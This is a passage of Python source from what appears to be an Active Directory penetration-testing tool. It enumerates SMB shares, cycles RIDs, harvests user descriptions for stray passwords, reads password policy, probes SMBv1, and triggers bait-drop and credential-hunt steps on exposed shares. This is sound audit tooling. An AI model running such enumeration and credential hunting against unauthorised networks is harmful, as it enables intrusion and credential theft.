        if key in seen:
            continue
        seen.add(key)
        normalized.append(token)
    return normalized


def confirm_large_smb_target_scope(
    shell: Any,
    *,
    targets: list[str],
    prompt_context: str,
) -> bool:
    """Warn before enumerating a very large SMB target scope."""
    if getattr(shell, "auto", False):
        return True
    return confirm_large_target_scope(
        shell,
        targets=targets,
        threshold=_SMB_TARGET_SCOPE_WARNING_THRESHOLD,
        title="[bold yellow]⚠️  SMB Scope Warning[/bold yellow]",
        context_label=prompt_context,
        recommendation_lines=[
            "Large share enumeration scopes can generate significant noise and take a long time.",
            "Recommendation: narrow the scope to likely member servers or a smaller subnet first.",
        ],
        confirm_prompt="Continue with this SMB target scope?",
        default_confirm=False,
    )


def _set_guest_smb_targets(shell: Any, *, domain: str, targets: list[str]) -> None:
    """Persist guest SMB target tokens in domain runtime state."""
    domain_data = shell.domains_data.setdefault(domain, {})
    domain_data["guest_smb_targets"] = list(targets)


def _resolve_guest_targets_default_input(
    *,
    shell: Any,
    current_targets: list[str],
    pdc_ip: str | None,
) -> str:
    """Resolve default text shown for custom guest target input prompt."""
    path_like_current = any(
        str(token).endswith(".txt") or "/" in str(token) for token in current_targets
    )
    if current_targets and not path_like_current:
        return ", ".join(current_targets)
    shell_hosts = str(getattr(shell, "hosts", "") or "").strip()
    if shell_hosts:
        return shell_hosts
    return str(pdc_ip or "").strip()


def _maybe_override_guest_smb_targets(
    shell: Any,
    *,
    domain: str,
    current_targets: list[str],
    current_source: str,
) -> tuple[list[str], str]:
    """Offer an interactive target override for guest share enumeration."""
    if getattr(shell, "auto", False):
        return current_targets, current_source
    if is_non_interactive(shell):
        return current_targets, current_source

    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return current_targets, current_source

    domain_data = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    pdc_ip = str(domain_data.get("pdc", "")).strip()
    enabled_computers = domain_relpath(
        shell.domains_dir, domain, "enabled_computers_ips.txt"
    )
    legacy_smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")

    option_labels: list[str] = []
    option_actions: list[str] = []

    if os.path.exists(enabled_computers):
        option_labels.append("Use enabled domain computers file (Recommended)")
        option_actions.append("enabled_file")

    option_labels.append("Use current guest target set")
    option_actions.append("keep_current")

    option_labels.append("Enter custom ranges/IPs now")
    option_actions.append("custom_input")

    if pdc_ip:
        option_labels.append("Use only validated PDC/DC")
        option_actions.append("pdc_only")

    if os.path.exists(legacy_smb_ips):
        option_labels.append("Use legacy smb/ips.txt file")
        option_actions.append("legacy_file")

    default_idx = 0
    selected_idx = selector(
        "Guest SMB target scope:",
        option_labels,
        default_idx=default_idx,
    )
    if selected_idx is None:
        return current_targets, current_source
    if not isinstance(selected_idx, int) or not (
        0 <= selected_idx < len(option_actions)
    ):
        return current_targets, current_source

    action = option_actions[selected_idx]

    if action == "keep_current":
        return current_targets, current_source
    if action == "enabled_file":
        targets = [enabled_computers]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "enabled_computers_file"
    if action == "legacy_file":
        targets = [legacy_smb_ips]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "smb_ips_file"
    if action == "pdc_only" and pdc_ip:
        targets = [pdc_ip]
        _set_guest_smb_targets(shell, domain=domain, targets=targets)
        return targets, "pdc_fallback"
    if action == "custom_input":
        default_input = _resolve_guest_targets_default_input(
            shell=shell,
            current_targets=current_targets,
            pdc_ip=pdc_ip or None,
        )
        while True:
            raw_input = Prompt.ask(
                Text(
                    "Enter SMB target ranges/IPs (comma/space-separated)",
                    style="cyan",
                ),
                default=default_input,
            ).strip()
            parsed_targets = _normalize_smb_target_tokens(raw_input)
            if not parsed_targets:
                print_warning(
                    "No valid SMB targets entered. Keeping the current guest target set."
                )
                return current_targets, current_source
            if not confirm_large_smb_target_scope(
                shell,
                targets=parsed_targets,
                prompt_context="Guest SMB target scope",
            ):
                print_info(
                    "Large SMB target scope rejected. Enter a narrower scope or keep the current one."
                )
                default_input = raw_input
                continue
            _set_guest_smb_targets(shell, domain=domain, targets=parsed_targets)
            shell.hosts = ", ".join(parsed_targets)
            return parsed_targets, "configured_custom"

    return current_targets, current_source


def run_guest_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via guest session and render results.

    Uses the native aiosmb stack.  load_target_entries expands file-based
    tokens (e.g. enabled_computers_ips.txt) to individual IP strings so
    run_native_shares_view can probe each host independently.
    """
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return

    target_tokens, target_source = _resolve_guest_smb_targets(shell, domain=domain)
    target_tokens, target_source = _maybe_override_guest_smb_targets(
        shell,
        domain=domain,
        current_targets=target_tokens,
        current_source=target_source,
    )
    if not target_tokens:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "No guest SMB targets available for domain "
            f"{marked_domain}. Configure targets first in start_unauth."
        )
        return

    guest_transport_username = resolve_smb_guest_username(shell=shell, domain=domain)

    # Expand each token: tokens can be file paths or direct IPs/hostnames.
    all_hosts: list[str] = []
    for token in target_tokens:
        expanded = load_target_entries(token)
        all_hosts.extend(sorted(expanded))

    if not all_hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"No resolvable guest SMB hosts for domain {marked_domain} "
            f"after expanding target tokens (source: {target_source})."
        )
        return

    print_info(
        f"Guest share enumeration as {mark_sensitive(guest_transport_username, 'user')} "
        f"against {len(all_hosts)} host(s) [source: {target_source}]."
    )

    for host_ip in all_hosts:
        view_set = run_native_shares_view(
            shell,
            domain=domain,
            host=host_ip,
            mode=SharesViewMode.LIVE,
            username=guest_transport_username,
            credential="",
        )
        # Print a quick access summary so the operator immediately sees which
        # shares are readable/writable before the credential-hunt prompt fires.
        if view_set is not None:
            readable = [
                v for v in (getattr(view_set, "views", []) or [])
                if getattr(v, "is_readable_live", False)
            ]
            writable = [
                v for v in (getattr(view_set, "views", []) or [])
                if getattr(v, "is_writable_live", False)
            ]
            if readable or writable:
                from adscan_internal.rich_output import print_success
                access_parts = []
                if readable:
                    access_parts.append(
                        f"READ: {', '.join(mark_sensitive(v.name, 'text') for v in readable)}"
                    )
                if writable:
                    access_parts.append(
                        f"WRITE: {', '.join(mark_sensitive(v.name, 'text') for v in writable)}"
                    )
                print_success(
                    f"Guest access on {mark_sensitive(host_ip, 'hostname')}: "
                    + "  ·  ".join(access_parts)
                )
            else:
                print_info(
                    f"No readable shares found on {mark_sensitive(host_ip, 'hostname')} "
                    "with guest credentials."
                )
        _offer_share_credential_hunt(
            shell, domain=domain, username=guest_transport_username, credential="", view_set=view_set
        )


def run_auth_shares(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Run authenticated SMB share enumeration and render results.

    Uses the native aiosmb stack.  Resolves the same target scope as the
    previous nxc path, then calls run_native_shares_view per host so
    each host gets its own premium share table.
    """
    if domain not in shell.domains:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain '{marked_domain}' is not configured. Please add or select a valid domain."
        )
        return

    marked_username = mark_sensitive(username, "user")
    marked_domain = mark_sensitive(domain, "domain")
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        print_error(f"No host targets are available for domain {marked_domain}.")
        return

    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)

    all_hosts = load_target_entries(targets_file)
    host_count = len(all_hosts)
    print_info(
        f"Checking share access as user {marked_username} in domain {marked_domain}"
    )
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {marked_domain}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB share scope: {mark_sensitive(source, 'detail')} "
        f"({host_count} target(s))"
    )

    ordered_hosts = sorted(all_hosts)
    total_hosts = len(ordered_hosts)

    # Liveness re-gate on 445 — skip hosts down since the port scan and avoid
    # stalling the per-host loop on a hung host (mirrors the SMB privilege sweep).
    if total_hosts > 1:
        from adscan_internal.services.host_reachability_filter import (  # noqa: PLC0415
            filter_reachable_hosts_sync,
            print_reachability_summary,
            render_no_reachable_panel,
        )

        share_reach = filter_reachable_hosts_sync(ordered_hosts, port=445)
        print_reachability_summary(share_reach, service_label="SMB")
        if not share_reach.reachable:
            render_no_reachable_panel(
                share_reach, operation_label="SMB Share Enumeration"
            )
            return
        ordered_hosts = list(share_reach.reachable)
        total_hosts = len(ordered_hosts)

    # Pre-mint ONE TGT for the whole multi-host share sweep and reuse its ccache
    # across hosts, so the secret touches the wire once instead of once per host
    # (scale + domain-lockout protection). SSOT: sweep_credential.
    # run_native_shares_view accepts a ``.ccache`` path in its ``credential`` slot.
    creds = getattr(shell, "current_creds", None) or {}
    share_auth_domain = creds.get("auth_domain") or domain
    share_kdc_ip = ""
    try:
        from adscan_internal.models.domain import resolve_dc_ip  # noqa: PLC0415

        share_kdc_ip = str(resolve_dc_ip(shell.domains_data.get(domain, {}) or {}) or "")
    except Exception:  # noqa: BLE001
        share_kdc_ip = ""
    from adscan_internal.services.sweep_credential import (  # noqa: PLC0415
        resolve_sweep_credential,
    )

    share_cred = resolve_sweep_credential(
        shell,
        domain=domain,
        username=username,
        password=password,
        auth_domain=share_auth_domain,
        kdc_ip=share_kdc_ip or None,
    )
    if not share_cred.ok:
        print_warning(
            share_cred.abort_reason
            or "SMB share enumeration aborted: credential pre-mint failed."
        )
        return
    share_secret = share_cred.ccache_path or share_cred.password or password

    # Collect every host's LIVE share view, then drive ONE consolidated premium
    # surface (overview panel + Step 1 writable-capture + Step 2 readable-hunt)
    # off the current user's effective access. The per-host inline action menu
    # (``_offer_share_credential_hunt``) is replaced by the consolidated flow so
    # the operator gets a single coherent surface across all hosts instead of a
    # blocking per-host menu. This path is ALWAYS live per-user — it never reads
    # the collector graph.
    # Shared circuit-breaker: abort the sweep the moment the audit credential is
    # locked out (or after consecutive logon failures) instead of re-asserting
    # the lockout against every remaining host. Protects the CUSTOMER's account
    # domain-wide — the same domain-lockout protection the pre-mint exists for,
    # extended to the rejection path the pre-mint cannot cover. SSOT: sweep_credential.
    from adscan_internal.services.sweep_credential import (  # noqa: PLC0415
        SweepLockoutGuard,
    )

    lockout_guard = SweepLockoutGuard()
    view_sets: list[Any] = []
    for index, host_ip in enumerate(ordered_hosts, start=1):
        # Per-host progress so the operator knows more hosts follow before the
        # consolidated surface renders.
        print_info(
            f"SMB share enumeration host {index}/{total_hosts}: "
            f"{mark_sensitive(host_ip, 'host')}"
        )
        view_set = run_native_shares_view(
            shell,
            domain=domain,
            host=host_ip,
            mode=SharesViewMode.LIVE,
            username=username,
            credential=share_secret,
        )
        if view_set is not None:
            view_sets.append(view_set)

        decision = lockout_guard.record(
            host_ip, getattr(view_set, "live_error", None)
        )
        if decision.should_abort:
            print_panel(
                (
                    f"{decision.reason}\n\n"
                    f"Swept {index} of {total_hosts} host(s) as "
                    f"{mark_sensitive(f'{username}@{domain}', 'user')} before "
                    "aborting; the remaining "
                    f"{total_hosts - index} host(s) were skipped to protect the "
                    "account."
                ),
                title="SMB share sweep aborted — credential locked out / rejected",
                border_style="red",
            )
            break

    _render_live_share_exposure_surface(
        shell,
        domain=domain,
        username=username,
        password=password,
        view_sets=view_sets,
    )


def _render_live_share_exposure_surface(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    view_sets: list[Any],
) -> None:
    """Render the consolidated premium share-exposure surface (live per-user).

    Builds renderer rows from the LIVE per-host :class:`ShareViewSet` objects
    (current user's effective access, share ACL intersected with NTFS via SMB2
    MaximalAccess — already computed by the native probe), renders the premium
    overview panel with an "Effective for" column, then runs the shared Step 1
    (writable-share capture) and Step 2 (readable-share credential hunt)
    substeps. The substeps are source-agnostic: they operate on rows / explicit
    targets and carry the audit/CTF capture defaults unchanged.
    """
    from adscan_internal.cli.smb_live_share_rows import build_live_share_rows  # noqa: PLC0415
    from adscan_internal.cli.share_exposure_phase import (  # noqa: PLC0415
        _run_readable_hunt_substep,
        _run_writable_capture_substep,
        _split_share_rows,
    )
    from adscan_core.output._attack_paths import (  # noqa: PLC0415
        render_smb_exposed_resources_panel,
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
    principal_label = mark_sensitive(f"{username}@{domain}", "user")

    rows = build_live_share_rows(
        view_sets,
        domain_data=domain_data,
        current_principal_label=principal_label,
    )

    if not rows:
        print_empty_state(
            "accessible shares",
            cause=(
                "No host in scope exposed a share readable or writable by "
                f"{principal_label}."
            ),
            suggestions=[
                "Try a different credential or a host with a wider share surface.",
                "Verify reachability: nmap -p 445 <host>",
            ],
            icon="📂",
        )
        return

    try:
        render_smb_exposed_resources_panel(
            rows,
            domain=domain,
            via_column_header="Effective for",
            effective_note=True,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)

    writable, readable = _split_share_rows(rows)

    # Sub-steps are independent: a failure in one never aborts the other.
    # Pin BOTH substeps to the principal this live surface was computed for
    # (``username``/``password``) — NOT the domain's active credential. The
    # surface proved this user's effective access via SMB2 MaximalAccess; the
    # bait drop and credential loot must run as that same principal or they hit
    # permission-denied on shares only this user can reach.
    try:
        _run_writable_capture_substep(
            shell,
            domain=domain,
            writable=writable,
            domain_data=domain_data,
            username=username,
            credential=password,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
    try:
        _run_readable_hunt_substep(
            shell,
            domain=domain,
            readable=readable,
            username=username,
            credential=password,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)


def run_rid_cycling(shell: Any, *, domain: str) -> None:
    """Run RID cycling against PDC and write discovered users list."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return

    print_operation_header(
        "RID Cycling Enumeration",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Method": "Guest Session",
            "Output": f"domains/{domain}/smb/smb_rid.log",
        },
        icon="🔢",
    )

    print_info_debug("Native LSARPC RID cycling · guest session · RID 500..2000")
    execute_smb_rid_cycling(shell, domain=domain, rid_max=2000, local_auth=False)


def _display_user_descriptions_with_rich(
    shell: Any, user_descriptions: dict[str, str]
) -> None:
    """Display user descriptions in a Rich table.

    Args:
        shell: Shell instance with display helpers.
        user_descriptions: Dictionary mapping username -> description.
    """
    # Use shell's display helper if available, otherwise use our own
    display_helper = getattr(shell, "_display_ldap_descriptions_with_rich", None)
    if callable(display_helper):
        display_helper(user_descriptions)
        return

    # Fallback: create our own Rich table
    table = Table(
        title="[bold cyan]User Descriptions Found[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Username", style="cyan")
    table.add_column("Description", style="yellow")

    for username, description in sorted(user_descriptions.items()):
        marked_username = mark_sensitive(username, "user")
        marked_description = mark_sensitive(description, "password")
        table.add_row(marked_username, marked_description)

    shell.console.print(Panel(table, border_style="bright_blue"))


def run_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Search for user descriptions in a target domain via native SAMR.

    Migrated from netexec ``smb --users`` to a native aiosmb SMB connection +
    :func:`native_samr_service.fetch_samr_user_details_via`. The legacy
    NetExec stdout was previously fed straight into
    :func:`parse_smb_user_descriptions`; here we synthesise an equivalent
    text block from the native SAMR records so the downstream Rich rendering
    and CredSweeper integration stay byte-identical with the legacy path.
    """
    import asyncio

    from adscan_internal.services.native_samr_service import (
        enumerate_samr_users_via,
        fetch_samr_user_details_via,
    )

    domain_data = shell.domains_data.get(domain, {}) or {}
    pdc = str(domain_data.get("pdc") or "").strip()
    if not pdc:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"PDC missing for domain {marked_domain}; cannot run SAMR descriptions."
        )
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_auth_type = mark_sensitive(domain_data.get("auth") or "unauth", "domain")
    print_info(
        f"Searching for descriptions in domain {marked_domain} with a {marked_auth_type} session (native SAMR)"
    )

    async def _run() -> tuple[list, str, str | None]:
        ctx = await _open_native_smb_for_auth_or_null(shell, domain)
        async with ctx as machine:
            users, status, error = await enumerate_samr_users_via(
                machine, domain_hint=domain, max_users=500
            )
            if status != "done" or not users:
                return users, status, error
            users, desc_status, desc_err = await fetch_samr_user_details_via(
                machine,
                users=users,
                domain_hint=domain,
                max_concurrency=8,
                timeout=120,
            )
            return users, desc_status, desc_err

    try:
        users, status, error = asyncio.run(_run())
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing native SAMR for SMB descriptions.")
        print_exception(show_locals=False, exception=exc)
        return

    if status == "denied":
        print_warning(
            f"SAMR descriptions denied on {marked_domain} (likely RestrictAnonymousSAM=1 "
            f"or non-privileged session). Detail: {error or '-'}"
        )
        return
    if status == "error":
        print_error(f"SAMR descriptions failed on {marked_domain}: {error or '-'}")
        return
    if not users:
        print_warning(f"No SMB descriptions found for domain {marked_domain}.")
        return

    domain_label = domain.split(".")[0].upper() or domain.upper()
    synthetic_output = _format_descriptions_as_netexec(
        pdc=pdc, domain_label=domain_label, users=users
    )

    user_descriptions = parse_smb_user_descriptions(synthetic_output)
    if not user_descriptions:
        user_descriptions = {
            u.username: (u.description or u.comment or u.full_name or "")
            for u in users
            if (u.description or u.comment or u.full_name)
        }

    if not user_descriptions:
        print_warning(f"No user descriptions present in domain {marked_domain}.")
        return

    print_success(
        f"Parsed {len(user_descriptions)} user description(s) from SAMR for domain {marked_domain}."
    )

    _display_user_descriptions_with_rich(shell, user_descriptions)

    if getattr(shell, "credsweeper_path", None):
        workspace_cwd = shell._get_workspace_cwd()
        smb_dir = domain_path(workspace_cwd, shell.domains_dir, domain, shell.smb_dir)
        os.makedirs(smb_dir, exist_ok=True)
        descriptions_file = os.path.join(smb_dir, "smb_descriptions.log")
        with open(descriptions_file, "w", encoding="utf-8") as desc_file:
            for user, desc in sorted(user_descriptions.items()):
                desc_file.write(f"{user}  {desc}\n")
        print_info_verbose(
            f"[smb-desc] Saved SMB descriptions to {descriptions_file} for password analysis"
        )
        from adscan_internal.cli.ldap import _analyze_descriptions_for_passwords

        cred_fields = {
            sam: {"description": desc}
            for sam, desc in user_descriptions.items()
            if desc
        }
        if cred_fields:
            try:
                _analyze_descriptions_for_passwords(
                    shell, descriptions_file, cred_fields, domain
                )
            except Exception as analysis_exc:  # noqa: BLE001
                telemetry.capture_exception(analysis_exc)
                print_warning(f"SMB description analysis failed: {analysis_exc}")

    try:
        log_path_abs = domain_path(
            shell._get_workspace_cwd(), shell.domains_dir, domain, "smb"
        )
        os.makedirs(log_path_abs, exist_ok=True)
        with open(
            os.path.join(log_path_abs, "null_descriptions.log"), "w", encoding="utf-8"
        ) as fh:
            fh.write(synthetic_output)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[smb-desc] failed to persist null_descriptions.log: {exc}")


def execute_netexec_pass_policy(shell: Any, *, domain: str) -> None:
    """Display the domain password policy from ADscan's native posture data.

    The default domain password policy is already fetched and persisted over
    LDAP by the posture system (``PasswordPolicySnapshot``). This reads that
    snapshot and renders it — no subprocess tool is spawned. When the policy is
    not yet cached, the idempotent posture freshness guard runs an authenticated
    live read first.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Target domain.
    """
    try:
        from adscan_internal.models.domain import resolve_dc_ip
        from adscan_internal.services.domain_posture import get_posture
        from adscan_internal.services.posture_orchestration import (
            ensure_posture_fresh,
        )
        from adscan_internal.services.posture_probe import ProbePhase
        from adscan_internal.services.async_bridge import run_async_sync

        domain_entry = (
            shell.domains_data.get(domain, {})
            if hasattr(shell, "domains_data")
            else {}
        )
        dc_ip = resolve_dc_ip(domain_entry or {})
        creds = (
            shell._build_probe_credentials(domain)
            if hasattr(shell, "_build_probe_credentials")
            else None
        )

        # Ensure the native posture holds a fresh password policy. Best-effort:
        # a probe failure never aborts the display — we render whatever snapshot
        # is already cached (if any).
        if dc_ip:
            try:
                run_async_sync(
                    ensure_posture_fresh(
                        shell,
                        domain=domain,
                        dc_ip=str(dc_ip),
                        creds=creds,
                        phase=ProbePhase.AUTH if creds is not None else None,
                    )
                )
            except Exception as probe_exc:  # noqa: BLE001 - best-effort guard
                telemetry.capture_exception(probe_exc)
                print_info_debug(
                    "[pass-pol] posture freshness guard skipped (non-fatal): "
                    f"{type(probe_exc).__name__}"
                )

        policy = getattr(
            get_posture(shell.domains_data, domain=domain),
            "password_policy",
            None,
        )
        if policy is None:
            print_error(
                "Could not read the domain password policy. Verify the "
                "credentials and domain controller reachability, then retry."
            )
            return

        _render_password_policy_table(shell, domain=domain, policy=policy)
        _record_password_policy_finding(shell, domain=domain, policy=policy)
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error reading the domain password policy.")
        print_exception(show_locals=False, exception=e)


def _password_policy_detail_dict(policy: Any) -> dict[str, Any]:
    """Return the technical-report ``details`` mapping for a policy snapshot.

    Keys mirror the previously-parsed fields so downstream report consumers and
    the ingestion layer keep the same contract after the native migration.
    """
    return {
        "minimum_password_length": policy.min_length,
        "complexity_enabled": bool(policy.require_complexity),
        "password_history_length": policy.password_history_length,
        "minimum_password_age_days": policy.minimum_password_age_days,
        "maximum_password_age_days": policy.max_age_days,
        "account_lockout_threshold": policy.lockout_threshold,
        "lockout_threshold_known": True,
        "lockout_enforced": bool(policy.lockout_enabled),
        "reset_account_lockout_counter_minutes": policy.lockout_window_minutes,
        "locked_account_duration_minutes": policy.lockout_duration_minutes,
        "source": policy.source,
    }


def _format_password_policy_rows(policy: Any) -> list[tuple[str, str]]:
    """Return ``(setting, value)`` display rows for a password policy snapshot."""

    def _days(value: Any) -> str:
        if value is None:
            return "Not read"
        return f"{value} day{'s' if value != 1 else ''}"

    def _minutes(value: Any) -> str:
        if value is None:
            return "Not read"
        return f"{value} minute{'s' if value != 1 else ''}"

    max_age = "Never expires" if policy.max_age_days is None else _days(policy.max_age_days)

    if not policy.lockout_threshold:
        lockout_threshold = "Disabled (0)"
    else:
        lockout_threshold = (
            f"{policy.lockout_threshold} attempt"
            f"{'s' if policy.lockout_threshold != 1 else ''}"
        )

    if policy.lockout_duration_minutes is None:
        lockout_duration = "Not read"
    elif policy.lockout_duration_minutes == 0:
        lockout_duration = "Admin unlock only"
    else:
        lockout_duration = _minutes(policy.lockout_duration_minutes)

    if policy.password_history_length is None:
        history = "Not read"
    else:
        history = (
            f"{policy.password_history_length} password"
            f"{'s' if policy.password_history_length != 1 else ''} remembered"
        )

    return [
        ("Minimum password length", f"{policy.min_length} characters"),
        ("Password complexity", "Enabled" if policy.require_complexity else "Disabled"),
        ("Password history length", history),
        ("Minimum password age", _days(policy.minimum_password_age_days)),
        ("Maximum password age", max_age),
        ("Account lockout threshold", lockout_threshold),
        ("Reset lockout counter after", _minutes(policy.lockout_window_minutes)),
        ("Locked account duration", lockout_duration),
    ]


def _render_password_policy_table(shell: Any, *, domain: str, policy: Any) -> None:
    """Render the domain password policy as a branded Rich table."""
    _ = shell  # console resolved via the shared helper (auto-mirrors to telemetry)
    marked_domain = mark_sensitive(domain, "domain")
    table = Table(show_header=True, header_style=f"bold {BRAND_COLORS['info']}")
    table.add_column("Setting", style="bold")
    table.add_column("Value")
    for setting, value in _format_password_policy_rows(policy):
        table.add_row(setting, value)
    print_panel_with_table(
        table,
        title=f"Domain Password Policy · {marked_domain}",
        border_style=BRAND_COLORS["info"],
    )


def _record_password_policy_finding(
    shell: Any,
    *,
    domain: str,
    policy: Any,
) -> None:
    """Persist password policy evidence into the technical report.

    The ``policy`` is a ``PasswordPolicySnapshot`` read from the native posture
    system. A plaintext summary is written to ``ldap/pass_policy.log`` so the
    finding still references a reviewable evidence artifact.
    """
    details = _password_policy_detail_dict(policy)

    try:
        from adscan_core.reporting.technical_report import record_technical_finding
        from adscan_internal.workspaces.subpaths import domain_path

        workspace_cwd = shell._get_workspace_cwd()
        ldap_dir = domain_path(workspace_cwd, shell.domains_dir, domain, "ldap")
        os.makedirs(ldap_dir, exist_ok=True)
        artifact_path = os.path.join(ldap_dir, "pass_policy.log")
        try:
            summary_lines = [
                f"{setting}: {value}"
                for setting, value in _format_password_policy_rows(policy)
            ]
            with open(artifact_path, "w", encoding="utf-8") as fh:
                fh.write("\n".join(summary_lines) + "\n")
        except Exception as write_exc:  # noqa: BLE001 - evidence is best-effort
            telemetry.capture_exception(write_exc)

        record_technical_finding(
            shell,
            domain,
            key="password_policy",
            value=True,
            details=details,
            evidence=[
                {
                    "type": "artifact",
                    "summary": "Domain password policy (native posture read)",
                    "artifact_path": artifact_path,
                }
            ],
        )
    except Exception as exc:  # pragma: no cover
        if not handle_optional_report_service_exception(
            exc,
            action="Technical finding sync",
            debug_printer=print_warning_debug,
            prefix="[pass-pol]",
        ):
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"[pass-pol] Failed to persist technical finding: {type(exc).__name__}: {exc}"
            )


def run_pass_policy(shell: Any, *, domain: str) -> None:
    """Display the default domain password policy from ADscan's posture data.

    This encapsulates the former ``do_netexec_pass_policy`` logic. The policy is
    read from the native posture system (LDAP), not a subprocess tool.
    """
    domain_creds = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    username = domain_creds.get("username")
    if not username:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Missing credentials for {marked_domain}. Cannot read the password policy."
        )
        return

    marked_domain = mark_sensitive(domain, "domain")
    print_info_verbose(f"Displaying password policy for domain {marked_domain}")
    execute_netexec_pass_policy(shell, domain=domain)


async def _probe_smbv1_hosts(
    hosts: list[str], *, timeout: float = 10.0, concurrency: int = 64
) -> list[str]:
    """Return the subset of ``hosts`` that answer a raw SMBv1 negotiate.

    Bounded-concurrency native sweep using ``smb_collector.smb1_probe`` — the
    same NT LM 0.12 negotiate NetExec used, with no subprocess. Never raises;
    a host that errors or times out is simply treated as not SMBv1-enabled.
    """
    import asyncio

    from adscan_internal.services.collector.smb_collector import smb1_probe

    sem = asyncio.Semaphore(concurrency)

    async def _one(host: str) -> str | None:
        async with sem:
            try:
                return host if await smb1_probe(host, timeout=timeout) else None
            except Exception:  # noqa: BLE001 — a probe failure is "not SMBv1"
                return None

    results = await asyncio.gather(*[_one(h) for h in hosts])
    return [h for h in results if h]


def _collect_smbv1_hosts_from_graph(
    shell: Any, *, domain: str
) -> tuple[list[str], list[str]] | None:
    """Return ``(all_probed_hosts, smbv1_enabled_hosts)`` from the collector graph.

    The native SMB collector's per-host negotiate already probes SMBv1 (persisted
    as the ``smb_v1`` Computer-node property) — so prefer that already-collected
    data over a fresh live sweep (the collector gathers this for every reachable
    host in one pass). Returns ``None`` when no host inventory carries SMB posture
    yet (graph missing / no Computer node has an ``smb_v1`` property), so the
    caller falls back to a live probe.
    """
    from adscan_internal.services.attack_graph_service import load_attack_graph

    graph = load_attack_graph(shell, domain)
    nodes = graph.get("nodes") if isinstance(graph, dict) else None
    if not isinstance(nodes, dict):
        return None

    all_hosts: list[str] = []
    vulnerable_hosts: list[str] = []
    probed_any = False
    for node in nodes.values():
        if not isinstance(node, dict):
            continue
        if str(node.get("kind") or "").strip().lower() != "computer":
            continue
        props = node.get("properties")
        props = props if isinstance(props, dict) else {}
        if "smb_v1" not in props:
            continue  # this host was not SMB-probed by the collector
        probed_any = True
        host = str(node.get("name") or props.get("samaccountname") or "").strip()
        if not host:
            continue
        all_hosts.append(host)
        if props.get("smb_v1"):
            vulnerable_hosts.append(host)

    if not probed_any:
        return None
    return all_hosts, vulnerable_hosts


def _record_smbv1_audit(
    shell: Any, *, domain: str, all_hosts: list[str], vulnerable_hosts: list[str]
) -> None:
    """Classify DC/non-DC, write artifact files, record + render the SMBv1 finding."""
    try:
        dc_hosts: list[str] = []
        non_dc_hosts: list[str] = []
        for host in vulnerable_hosts:
            is_dc = False
            if hasattr(shell, "is_computer_dc"):
                try:
                    is_dc = bool(shell.is_computer_dc(domain, host))
                except Exception as exc:  # pragma: no cover
                    if not handle_optional_report_service_exception(
                        exc,
                        action="Technical finding sync",
                        debug_printer=print_info_debug,
                        prefix="[smb-null]",
                    ):
                        telemetry.capture_exception(exc)
            if is_dc:
                dc_hosts.append(host)
            else:
                non_dc_hosts.append(host)

        summary = {
            "all_computers": all_hosts or None,
            "dcs": dc_hosts or None,
            "non_dcs": non_dc_hosts or None,
            # The native negotiate probe yields a boolean per host, not the
            # per-host banner rows the old nxc parser produced.
            "entries": None,
            "count": len(vulnerable_hosts),
            "domain_controller_count": len(dc_hosts),
            "non_domain_controller_count": len(non_dc_hosts),
        }

        smb_dir = domain_path(
            shell._get_workspace_cwd(), shell.domains_dir, domain, "smb"
        )
        os.makedirs(smb_dir, exist_ok=True)
        vulnerable_file = os.path.join(smb_dir, "smbv1_enabled.txt")
        vulnerable_dcs_file = os.path.join(smb_dir, "smbv1_enabled_dcs.txt")
        vulnerable_non_dcs_file = os.path.join(smb_dir, "smbv1_enabled_non_dcs.txt")
        for path, hosts in (
            (vulnerable_file, vulnerable_hosts),
            (vulnerable_dcs_file, dc_hosts),
            (vulnerable_non_dcs_file, non_dc_hosts),
        ):
            with open(path, "w", encoding="utf-8") as handle:
                if hosts:
                    handle.write("\n".join(hosts) + "\n")

        value_to_store = {
            "all_computers": vulnerable_hosts or None,
